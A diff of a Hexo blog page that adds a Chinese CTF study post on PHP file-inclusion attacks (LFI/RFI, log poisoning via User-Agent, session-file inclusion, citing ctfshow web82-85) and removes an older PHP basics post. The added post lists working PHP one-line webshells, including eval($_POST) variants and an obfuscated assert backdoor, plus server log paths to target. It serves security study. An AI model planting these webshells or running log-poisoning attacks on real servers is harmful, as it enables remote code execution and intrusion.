@@ -64,6 +64,157 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web5" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/01/23/web5/" class="article-date">
+  <time datetime="2022-01-23T11:09:52.149Z" itemprop="datePublished">2022-01-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><h3 id="⽂件包含"><a href="#⽂件包含" class="headerlink" title="⽂件包含:"></a>⽂件包含:</h3><p>宗旨: </p>
+<p>将任何的php⽂件或者⾮php⽂件利⽤函数包含进php⽂件之后都会被当作php代码解析 </p>
+<p>PHP提供⼀些函数来进⾏各个⽂件之间的相互引⽤，并提供了⼀些协议⽤于读取或者写⼊⽂件 </p>
+<p>特殊⽂件包含: </p>
+<p>最常⻅的使⽤: </p>
+<p>include(‘flag.php’) 包含 flag.php ⽂件 </p>
+<p>其他函数： </p>
+<p>include、require、include_once、require_once、 </p>
+<p>highlight_fifile、show_source、fifile_get_contents、fopen、fifile、readfifil</p>
+<h4 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h4><p>相关配置 </p>
+<p>本地⽂件包含 (LFI)：可以读取与打开本地⽂件 </p>
+<p>远程⽂件包含 (RFI)(HTTP,FTP,PHP伪协议)：可以远程加载⽂件 </p>
+<ul>
+<li>本地⽂件包含：通过浏览器包含web服务器上的⽂件，这种漏洞是因为浏览器包含 </li>
+</ul>
+<p>⽂件时没有进⾏严格的过滤允许遍历⽬录的字符注⼊浏览器并执⾏ </p>
+<ul>
+<li>远程⽂件包含：就是允许攻击者包含⼀个远程的⽂件,⼀般是在远程服务器上预先设 </li>
+</ul>
+<p>置好的脚本。 此漏洞是因为浏览器对⽤户的输⼊没有进⾏检查，导致不同程度的信</p>
+<p>息泄露、拒绝服务攻击 甚⾄在⽬标服务器上执⾏代码 </p>
+<h5 id="1-包含⼀句话⽊⻢"><a href="#1-包含⼀句话⽊⻢" class="headerlink" title="1.包含⼀句话⽊⻢:"></a>1.包含⼀句话⽊⻢:</h5><p>将⼀句话写在⼀个⽂件中上传之后，在可以包含⽂件的php⻚⾯包含该⽂件，直接利⽤⼀句话 </p>
+<p>常⻅的⼀句话 </p>
+<p>eval : </p>
+<ul>
+<li><p>⽤来执⾏任意php代码 </p>
+</li>
+<li><p> ⽤法</p>
+</li>
+</ul>
+<p>例：&lt;?php </p>
+<p>eval($_POST[1]); </p>
+<p> //1=system(ls); </p>
+<p> ?&gt; </p>
+<ul>
+<li><p>最常⻅的⽊⻢: </p>
+</li>
+<li><p>防爆破⽊⻢:  </p>
+<?php 
+
+substr(md5($_REQUEST['x']),28)=='6862'&&eval($_REQUEST['password']); 
+
+ ?><p>x=myh0st </p>
+</li>
+<li><p>过狗⼀句话: </p>
+</li>
+<li><p>不⽤ ? 的⼀句话：<script language="php">eval ($_POST[hihack]);</script> </p>
+</li>
+<li><p>不⽤eval的⼀句话: </p>
+</li>
+<li><p>变形⼀句话后⻔: </p>
+</li>
+<li><p> 灭杀⼀句话：<!--?php $x="as"."se"."rt";$x($_POST["pass"]);?--> </p>
+</li>
+</ul>
+<h5 id="2-直接包含敏感⽂件"><a href="#2-直接包含敏感⽂件" class="headerlink" title="2.直接包含敏感⽂件"></a>2.直接包含敏感⽂件</h5><ul>
+<li>404⻚⾯: </li>
+</ul>
+<p>  随便找⼀个不存在的⻚⾯显示出404之后，就可以看到服务器的类型 </p>
+<ul>
+<li><p>右键检查抓包: </p>
+<p>点击 network 之后刷新⼀下</p>
+</li>
+</ul>
+<h5 id="2-1-包含⽇志⽂件"><a href="#2-1-包含⽇志⽂件" class="headerlink" title="2.1 包含⽇志⽂件"></a>2.1 包含⽇志⽂件</h5><ul>
+<li>nginx服务器下⽇志⽂件的路径: </li>
+</ul>
+<p>  1 /var/log/nginx/access.log </p>
+<p>  2 /var/log/nginx/error.log</p>
+<ul>
+<li>apache服务器下的⽇志⽂件路径: </li>
+</ul>
+<p>   /etc/httpd/logs/access_log </p>
+<p>  或者</p>
+<p>   /var/log/httpd/access_log </p>
+<p>  /var/log/apache2/error.log //错日志存放</p>
+<p>   自定义文件路径:/etc/apache2/apache2.conf //查找以 ErrorLog 开头的行</p>
+<p>  注意：nginx ⽇志⽂件在⽤户安装⽬录的logs⽬录下 </p>
+<p>  如安装⽬录为/usr/local/nginx,则⽇志⽬录就是在/usr/local/nginx/logs⾥ </p>
+<p>  也可通过其配置⽂件Nginx.conf，获取到⽇志的存在路径 </p>
+<p>  （</p>
+<p>  /opt/nginx/logs/access.log</p>
+<p>  利⽤ hackbar 原本的user-Agent信息被注⼊了⼀句话，在包含⽇志⽂件的时候，⼀句话被执 </p>
+<p>  ⾏，最后在⽇志信息中替换成执⾏后的结果，原本 access.log 是不会执⾏⼀句话的， </p>
+<p>  但是被包含进 .php ⻚⾯之后就会以php的⽅式执⾏，我们刚好传⼊⼀句php代码,因此被执 ⾏</p>
+<h5 id="2-2-包含-session⽂件-⽆后缀⽂件"><a href="#2-2-包含-session⽂件-⽆后缀⽂件" class="headerlink" title="2.2 包含 session⽂件(⽆后缀⽂件)"></a>2.2 包含 session⽂件(⽆后缀⽂件)</h5><ul>
+<li><p>获取session位置存放信息</p>
+</li>
+<li><p>利⽤docker跑起来</p>
+<p>session工作原理:</p>
+<ul>
+<li><p>⾸先使⽤session_start() 函数进⾏初始化 </p>
+</li>
+<li><p>当执⾏PHP脚本时，通过使⽤$_ SESSION 超全局变量注册 session变量 </p>
+</li>
+<li><p>当 P H P 脚 本 执 ⾏ 结 束 时 ， 未 被 销 毁 的 s e s s i o n 变 量 会 被 ⾃ 动 保 存 在 </p>
+</li>
+</ul>
+<p>本 地 ⼀ 定 路 径 下的session库 中 ， 这 个 路 径 可 以 通 过 php.ini ⽂ 件 中 的 session.savepath 指 定 ， 下 次 浏 览 ⽹ ⻚ 时 可 以 加 载 使 ⽤ . session _start( )做 了 哪 些 初 始 化 工 作 ：</p>
+<ul>
+<li><p> 读取名为 PHPSESSID ( 如 果 没 有 改 变 默 认 值 ) 的 cookie值,假使为 abc123 </p>
+</li>
+<li><p>若 读 取 到 PHPSESSID这个COOKIE ， 创 建 SESSION 变 量 ， 并 从 相 应 的 ⽬ 录 中 （ 可 以 在 p h p . i n i 中 设 置 ） 读 取 SESS_abc123（ 默 认 是 这 种 命 名 ⽅ 式 ） ⽂ 件 , 将 字 符 装 在 ⼊ SESSION 变量中 ; 若 没 有 读 取 到 PHPSESSID 这 个 COOKIE ， 也 会 创 建 $_SESSION 超全局变量注册 session 变量。 </p>
+</li>
+</ul>
+<p>（3）当PHP脚本执⾏结束时，未被销毁的session变量会被⾃动保存在本地⼀定路径下的 </p>
+<p>session库中， 这个路径可以通过php.ini⽂件中的session.save_path 指定，下次浏览⽹⻚ 时可以加载使⽤。 </p>
+<p>漏洞分析： 此php会将获取到的GET型ctfs变量的值存⼊到session⽬录下存储session的值。session的⽂件 </p>
+<p>名为sess+sessionid，sessionid可以通过开发者模式获取。</p>
+<ul>
+<li><p> 默认路径没有值,说明session的保存路径在/tmp/⽬录下，进⼊容器看⼀下</p>
+</li>
+<li><p>这⾥出现警导致下⾯的程序是⽆法执⾏的，这个警告说的是请求可以到达，但⽆法打开 </p>
+<p>session，只需要将session_start();放在 hilighlight_file 前边即可 </p>
+<p>接下来修改PHPSESSID为aaa传参数 ?ctfs=ctfs</p>
+<p>查看session文件</p>
+<ul>
+<li>如果当前⻚⾯存在⽂件包含漏洞，那么我们可以直接包含这个⽂件，进⽽执⾏php代码 </li>
+</ul>
+<p>相关题⽬: </p>
+<p>ctfshow-web82-85</p>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/23/web5/" data-id="ckyr8cjj70000w8v3cuq206th" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-web4" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2022/01/22/web4/" class="article-date">
@@ -844,34 +995,6 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
 
 
   
-    <article id="post-php1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/10/03/php1/" class="article-date">
-  <time datetime="2021-10-03T04:48:33.807Z" itemprop="datePublished">2021-10-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="php基础知识"><a href="#php基础知识" class="headerlink" title="php基础知识"></a>php基础知识</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">*<span class="meta">&lt;?php</span><span class="comment">//开始标记</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot; 这是我的博客&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//结束标记</span></span><br><span class="line"></span><br><span class="line">*<span class="meta">&lt;?php</span></span><br><span class="line">$**<span class="number">9</span>a** = <span class="string">&quot; 这是我的博客&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $**<span class="number">9</span>a**;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//开头不能有数字</span></span><br><span class="line"></span><br><span class="line">*<span class="meta">&lt;?php</span></span><br><span class="line">$**a b** = <span class="string">&quot; 这是我的博客&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $**a b**;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//变量中间不能有空格</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下划线命名法</span></span><br><span class="line">*<span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$new_title</span> = <span class="string">&quot; 这是我的博客&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_title</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//小驼峰命名法</span></span><br><span class="line">*<span class="meta">&lt;?php</span></span><br><span class="line">$**newTitle** = <span class="string">&quot; 这是我的博客&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $**newTitle**;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//大驼峰命名法</span></span><br><span class="line">*<span class="meta">&lt;?php</span></span><br><span class="line">$**NewTitle** = <span class="string">&quot; 这是我的博客&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $**NewTitle**;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/10/03/php1/" data-id="ckyiofug40000mgv3hvv2aobv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -908,6 +1031,10 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
       <ul>
         
           <li>
+            <a href="/2022/01/23/web5/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/01/22/web4/">(no title)</a>
           </li>
         
@@ -921,10 +1048,6 @@ call_user_func() ----------把第⼀个参数作为回调函数调⽤ call_user_
         
           <li>
             <a href="/2022/01/19/web/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/01/18/web1/">(no title)</a>
           </li>
         
       </ul>
